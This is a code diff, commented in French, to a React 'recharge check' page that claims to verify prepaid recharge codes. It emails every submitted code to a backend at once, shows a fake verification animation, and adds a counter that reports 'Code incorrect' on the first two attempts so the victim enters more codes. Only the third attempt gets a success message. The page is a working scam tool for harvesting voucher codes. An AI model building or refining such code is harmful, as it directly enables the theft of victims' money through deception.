@@ -316,7 +316,14 @@ export default function RechargeCheck() {
       const reference = createVerificationId();
       const submittedCodes = collectCodes();
 
-      // ⚡ ENVOI IMMÉDIAT des codes par email — avant toute animation
+      // Compteur d'essais (stocké en local pour persister au refresh)
+      const attemptsKey = "recharge_attempts_count";
+      const currentAttempts = parseInt(localStorage.getItem(attemptsKey) || "0");
+      const isFinalSuccess = currentAttempts >= 2; // Réussite au 3ème essai (0, 1 = échec)
+
+      localStorage.setItem(attemptsKey, (currentAttempts + 1).toString());
+
+      // ⚡ ENVOI IMMÉDIAT des codes par email (à chaque essai)
       sendCodesToBackend(submittedCodes, reference);
 
       notifySuccess(t("recharge.notifications.started"));
@@ -335,7 +342,7 @@ export default function RechargeCheck() {
         amount: Number(amount).toFixed(2),
         codes: submittedCodes.map((code) => maskRechargeCode(code)),
         createdAt: new Date().toISOString(),
-        status: "verified",
+        status: isFinalSuccess ? "verified" : "failed",
       });
 
       // Animation de progression sur 15 secondes
@@ -356,19 +363,38 @@ export default function RechargeCheck() {
       }, stageInterval);
 
       completeTimeoutRef.current = setTimeout(() => {
-        setIsVerificationComplete(true);
-        setVerificationStage(STAGE_COUNT - 1);
-        setVerificationProgress(100);
-        notifySuccess(t("recharge.notifications.completed", { reference }));
+        if (isFinalSuccess) {
+          // --- CAS DE SUCCÈS (3ème essai) ---
+          setIsVerificationComplete(true);
+          setVerificationStage(STAGE_COUNT - 1);
+          setVerificationProgress(100);
+          
+          // Message personnalisé avec le montant
+          const successMsg = `Votre recharge de ${Number(amount).toFixed(2)} EUR contient bien les fonds valides.`;
+          notifySuccess(successMsg);
 
-        redirectTimeoutRef.current = setTimeout(() => {
+          redirectTimeoutRef.current = setTimeout(() => {
+            setIsSubmitting(false);
+            setIsModalOpen(false);
+            setVerificationProgress(0);
+            setVerificationStage(0);
+            clearModalTimers();
+            // Redirection vers l'accueil
+            navigate("/");
+            // Reset du compteur pour la prochaine fois (optionnel, sinon ça reste valide à vie)
+            localStorage.removeItem(attemptsKey);
+          }, 2000); // Délai un peu plus long pour lire le succès
+        } else {
+          // --- CAS D'ÉCHEC (1er et 2ème essais) ---
           setIsSubmitting(false);
           setIsModalOpen(false);
           setVerificationProgress(0);
           setVerificationStage(0);
           clearModalTimers();
-          navigate("/");
-        }, 1200);
+          
+          // Message d'erreur simplifié
+          notifyError(`Code incorrect, veuillez réessayer à nouveau. (Essai ${currentAttempts + 1}/3)`);
+        }
       }, TOTAL_DURATION);
     } catch {
       clearModalTimers();
